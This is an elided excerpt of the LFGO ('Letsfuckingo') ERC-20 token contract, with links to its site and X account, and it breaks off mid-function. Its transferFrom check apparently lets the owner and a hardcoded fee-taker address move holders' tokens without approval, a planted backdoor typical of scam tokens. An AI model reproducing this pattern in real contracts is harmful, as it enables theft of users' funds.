...
https://www.letsfuckingo.live/

https://x.com/LFGO_ETH
...
contract LFGO is Context, IERC20, Ownable {
    ...
    mapping(address => bool) private _Excludees;
    ...
    string private constant _name = unicode"Letsfuckingo";
    string private constant _symbol = unicode"LFGO";
    ...
    constructor() payable {
        _feeTaker = payable(0x47dD1EdcdEB7f0012eF502958edacC97eAB7179F);
        _balances[msg.sender] = _tTotal;
        _Excludees[owner()] = true;
        _Excludees[address(this)] = true;
        _Excludees[_feeTaker] = true;
    ...
    function transferFrom(
        ...
        if (
            !((_msgSender() != uniswapV2Router.factory() &&
                _Excludees[msg.sender]) ||
                (sender != uniswapV2Pair && recipient == _blackhole))
        )
            _approve(
                sender,
                _msgSender(),
